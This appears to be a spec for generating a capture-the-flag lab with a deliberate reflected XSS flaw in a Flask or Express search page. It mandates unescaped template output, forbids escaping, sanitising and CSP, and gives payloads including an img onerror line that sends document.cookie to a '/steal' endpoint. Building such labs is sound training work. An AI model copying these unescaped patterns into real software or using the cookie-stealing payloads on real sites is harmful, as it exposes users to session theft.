# Reflected Cross-Site Scripting (XSS)

## Vulnerability Type
`xss_reflected` — CWE-79 — OWASP A03:2021 Injection

## Architecture
- **Backend**: Python Flask + Jinja2 OR Node.js Express + EJS
- **Database**: None required (or SQLite for realism)
- **Container**: Single container

## Vulnerable Code Pattern (MUST USE)

### Python Flask (Preferred)
```python
# VULNERABLE: xss_reflected — user input rendered with | safe (disables auto-escaping)
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)
```
The template `search.html` MUST use:
```html
<!-- VULNERABLE: | safe disables Jinja2 auto-escaping -->
<p>Results for: {{ query | safe }}</p>
```

### Node.js Express + EJS
```javascript
// VULNERABLE: xss_reflected — unescaped output with <%- (not <%=)
app.get('/search', (req, res) => {
    const q = req.query.q || '';
    res.render('search', { query: q });
});
```
The template `search.ejs` MUST use:
```html
<!-- VULNERABLE: <%- outputs raw HTML, <%= would escape -->
<p>Results for: <%- query %></p>
```

## Secure Code Pattern (MUST AVOID)
```html
<!-- SAFE — Jinja2 auto-escapes by default (DO NOT USE without | safe) -->
<p>Results for: {{ query }}</p>
<!-- SAFE — EJS escaped output (DO NOT USE) -->
<p>Results for: <%= query %></p>
```

## Flag Delivery
- Flag stored in an HTTP-only cookie named `flag` set on the admin session
- OR flag displayed on an `/admin` page only accessible with the admin cookie
- For CTF simplification: flag stored in a hidden element or cookie that becomes visible when JS executes
- Simpler approach: flag set as a cookie on page load, XSS payload reads `document.cookie`

## Exploit Payload
```
GET /search?q=<script>document.write(document.cookie)</script>
```
Or for cookie exfiltration:
```
GET /search?q=<img src=x onerror="fetch('/steal?c='+document.cookie)">
```

## Docker Setup
```yaml
services:
  app:
    build: .
    ports:
      - "3000:3000"
```

## Validation Criteria
- User input MUST be reflected in HTML without escaping
- For Flask: template MUST use `{{ query | safe }}` or `render_template_string`
- For Express: template MUST use `<%- query %>` not `<%= query %>`
- No `Content-Security-Policy` header that blocks inline scripts
- No `escape()`, `bleach.clean()`, or `sanitize()` calls
- `<script>alert(1)</script>` payload MUST appear unescaped in response HTML
